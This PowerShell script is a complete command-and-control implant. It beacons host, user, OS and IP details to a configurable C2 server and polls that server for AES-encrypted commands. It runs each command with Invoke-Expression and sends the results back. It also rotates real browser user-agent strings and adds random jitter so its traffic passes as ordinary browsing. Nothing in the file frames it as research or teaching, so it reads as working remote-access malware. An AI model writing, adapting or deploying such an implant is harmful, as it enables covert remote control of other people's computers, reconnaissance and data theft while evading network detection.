param(
    [string]$C2Url       = "http://127.0.0.1:8080",
    [string]$KeyHex      = "000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F",
    [int]$PollInterval   = 5,
    [int]$JitterMs       = 3000,
    [int]$MaxRetries     = 0,
    [string]$AgentId     = [guid]::NewGuid().ToString("N").Substring(0, 8)
)

# Rotate through real browser UAs so traffic fingerprints as browsing
$UA_POOL = @(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
)

# ── AES-256-CBC helpers ──────────────────────────────────────────────────────

function Convert-HexToBytes {
    param([string]$Hex)
    $out = New-Object byte[] ($Hex.Length / 2)
    for ($i = 0; $i -lt $out.Length; $i++) {
        $out[$i] = [Convert]::ToByte($Hex.Substring($i * 2, 2), 16)
    }
    return $out
}

function Invoke-AesEncrypt {
    param([string]$PlainText, [byte[]]$Key)
    $aes           = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize   = 256
    $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key       = $Key
    $aes.GenerateIV()
    $enc   = $aes.CreateEncryptor()
    $plain = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $cipher = $enc.TransformFinalBlock($plain, 0, $plain.Length)
    return [Convert]::ToBase64String($aes.IV + $cipher)   # IV | ciphertext
}

function Invoke-AesDecrypt {
    param([string]$B64, [byte[]]$Key)
    $raw    = [Convert]::FromBase64String($B64)
    $iv     = $raw[0..15]
    $cipher = $raw[16..($raw.Length - 1)]
    $aes           = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize   = 256
    $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key       = $Key
    $aes.IV        = $iv
    $dec   = $aes.CreateDecryptor()
    $plain = $dec.TransformFinalBlock($cipher, 0, $cipher.Length)
    return [System.Text.Encoding]::UTF8.GetString($plain)
}

# ── HTTP helpers ─────────────────────────────────────────────────────────────

function New-WebClient {
    $wc = New-Object System.Net.WebClient
    $wc.Headers["User-Agent"]    = $UA_POOL | Get-Random
    $wc.Headers["Content-Type"]  = "application/x-www-form-urlencoded"
    $wc.Headers["X-Session-Id"]  = $AgentId
    return $wc
}

function Send-Beacon {
    param([byte[]]$Key)
    $ip = try {
        (Get-NetIPAddress -AddressFamily IPv4 |
         Where-Object { $_.IPAddress -notmatch '^(127\.|169\.)' } |
         Select-Object -First 1).IPAddress
    } catch { "unknown" }

    $os = try { (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption } catch { $env:OS }

    $payload = "BEACON|HOST=$env:COMPUTERNAME|USER=$env:USERDOMAIN\$env:USERNAME|OS=$os|ARCH=$env:PROCESSOR_ARCHITECTURE|PID=$PID|IP=$ip"

    try {
        $wc = New-WebClient
        $enc = [System.Web.HttpUtility]::UrlEncode((Invoke-AesEncrypt -PlainText $payload -Key $Key))
        $wc.UploadString("$C2Url/result", "d=$enc") | Out-Null
    } catch {}
}

function Poll-Command {
    param([byte[]]$Key)
    $wc = New-WebClient
    $resp = $wc.DownloadString("$C2Url/task")
    if ([string]::IsNullOrWhiteSpace($resp)) { return $null }
    return Invoke-AesDecrypt -B64 $resp.Trim() -Key $Key
}

function Post-Result {
    param([string]$Output, [byte[]]$Key)
    $enc = [System.Web.HttpUtility]::UrlEncode((Invoke-AesEncrypt -PlainText $Output -Key $Key))
    $wc  = New-WebClient
    $wc.UploadString("$C2Url/result", "d=$enc") | Out-Null
}

# ── Main loop ────────────────────────────────────────────────────────────────

Add-Type -AssemblyName System.Web

$key     = Convert-HexToBytes -Hex $KeyHex
$attempt = 0

Send-Beacon -Key $key

while ($MaxRetries -eq 0 -or $attempt -lt $MaxRetries) {
    $attempt++
    try {
        $cmd = Poll-Command -Key $key

        if ($null -ne $cmd) {
            if ($cmd -in @("exit", "quit")) { break }

            $output = try {
                Invoke-Expression $cmd 2>&1 | Out-String
            } catch {
                "ERROR: $_"
            }

            Post-Result -Output $output.TrimEnd() -Key $key
        }

        $attempt = 0
    }
    catch { }

    $jitter = Get-Random -Minimum 0 -Maximum $JitterMs
    Start-Sleep -Milliseconds (($PollInterval * 1000) + $jitter)
}
